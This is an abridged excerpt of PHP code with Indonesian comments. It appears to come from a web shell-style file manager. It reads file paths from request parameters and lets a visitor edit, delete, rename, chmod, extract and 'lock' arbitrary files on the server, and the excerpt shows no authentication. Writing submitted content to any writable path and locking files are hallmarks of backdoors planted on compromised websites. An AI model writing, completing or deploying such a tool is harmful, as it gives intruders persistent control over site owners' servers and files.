...
// --- HANDLER UNTUK LOCK ACTION ---
// HANDLER UNTUK LOCK ACTION
if (isset($_GET['lock_action'])) {
    $target_file = isset($_GET['target_file']) ? urldecode($_GET['target_file']) : '';
    $action = $_GET['lock_action'];
    $current_dir = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd());
    
    if (empty($target_file) || !file_exists($target_file)) {
        redirect_with_message('error', 'File tidak ditemukan!', $current_dir);
    }
...
// --- BULK LOCK/UNLOCK ---
if (isset($_POST['bulk_lock_action']) && !empty($_POST['bulk_lock_action'])) {
...
if(isset($_GET['option']) && isset($_POST['opt_action'])){ $target_full_path = $_POST['path_target']; $action = $_POST['opt_action']; $current_dir = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd()); switch ($action) { 
    ...
    case 'edit_save': 
        if(is_writable($target_full_path)) { 
            if(file_put_contents($target_full_path, $_POST['src_content'])) redirect_with_message('success', 'EDIT SUCCESS !!', $current_dir); 
...
if ($show_file_list) {
    ...
    echo '<th>Name</th><th>Size</th><th>Perm</th>';
    echo '<th>Lock Status</th>'; // Kolom status lock
    ...
    if ($scandir_items) {
        usort($scandir_items, function($a, $b) use ($path) { 
            if ($a == '..') return -1; 
            if ($b == '..') return 1; 
            if (is_dir($path.'/'.$a) && !is_dir($path.'/'.$b)) return -1; 
            if (!is_dir($path.'/'.$a) && is_dir($path.'/'.$b)) return 1; 
        ...
        foreach($scandir_items as $item){
            ...
            // Kolom Options dengan menu LOCK
            echo "<td class='td_home' style='text-align:center;'>";
            echo "<select style='width:130px;' onchange=\"if(this.value) window.location.href='?action='+this.value+'&target_file={$encoded_full_item_path}&path=".urlencode($path)."'\">";
            echo "<option value=''>Action</option>";
            
            if (is_file($full_item_path) && $item != '..') {
                // Menu Lock/Unlock
                if ($isLocked) {
                    echo "<option value='' style='color:#FF0033;' disabled>--- 🔒 LOCKED ---</option>";
                    echo "<option value='' onclick=\"if(confirm('Unlock file?')) window.location.href='?lock_action=unlock&target_file={$encoded_full_item_path}&path=".urlencode($path)."'\">🔓 Unlock</option>";
                ...
                echo "<option value='edit_form'>✏️ Edit</option>";
                if(class_exists('ZipArchive') && pathinfo($full_item_path, PATHINFO_EXTENSION) == 'zip') 
                    echo "<option value='extract_form'>📦 Extract</option>";
                echo "<option value='delete'>🗑️ Delete</option>";
            } else {
                echo "<option value='delete'>🗑️ Delete</option>";
            }
            
            echo "<option value='rename_form'>✏️ Rename</option>";
            echo "<option value='chmod_form'>🔐 Chmod</option>";
            echo "</select>";
            echo "</td></tr>";
        }
    } else { 
        echo "<tr><td colspan='6' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; 
    }
